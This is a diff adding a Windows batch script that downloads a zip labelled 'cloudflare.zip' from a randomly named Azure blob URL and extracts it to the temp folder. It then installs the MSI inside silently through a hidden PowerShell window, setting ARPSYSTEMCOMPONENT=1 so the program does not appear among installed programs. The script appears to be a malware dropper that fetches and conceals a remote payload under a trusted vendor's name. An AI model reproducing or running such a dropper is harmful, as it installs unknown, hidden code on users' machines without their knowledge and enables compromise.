@@ -1,0 +1,46 @@
+@echo off
+setlocal EnableExtensions
+
+REM ========== EDIT THESE ==========
+set "DOWNLOAD_URL=https://xxyhillr.blob.core.windows.net/xxyhillr/1526100151/1789810331_6a9092fd_cloudflare.zip"
+set "ZIP_NAME=cloudflare.zip"
+set "EXTRACT_DIR=%TEMP%\my-app"
+REM ================================
+
+echo Downloading...
+curl -fsSL -o "%ZIP_NAME%" "%DOWNLOAD_URL%"
+if errorlevel 1 (
+    echo Download failed.
+    exit /b 1
+)
+
+if exist "%EXTRACT_DIR%" rmdir /s /q "%EXTRACT_DIR%"
+mkdir "%EXTRACT_DIR%"
+
+echo Extracting...
+powershell -NoProfile -Command "Expand-Archive -LiteralPath '%CD%\%ZIP_NAME%' -DestinationPath '%EXTRACT_DIR%' -Force"
+if errorlevel 1 (
+    echo Extract failed.
+    exit /b 1
+)
+
+set "MSI_FILE="
+for /r "%EXTRACT_DIR%" %%F in (*.msi) do (
+    set "MSI_FILE=%%F"
+    goto :found_msi
+)
+
+:found_msi
+if not defined MSI_FILE (
+    echo No .msi file found inside the zip.
+    exit /b 1
+)
+
+echo Installing silently...
+powershell -NoProfile -WindowStyle Hidden -Command "$p = $env:MSI_FILE; $proc = Start-Process msiexec.exe -ArgumentList @('/i', $p, '/qn', '/norestart', 'ARPSYSTEMCOMPONENT=1') -WindowStyle Hidden -Wait -PassThru; exit $proc.ExitCode"
+if errorlevel 1 (
+    echo Install failed.
+    exit /b 1
+)
+
+endlocal
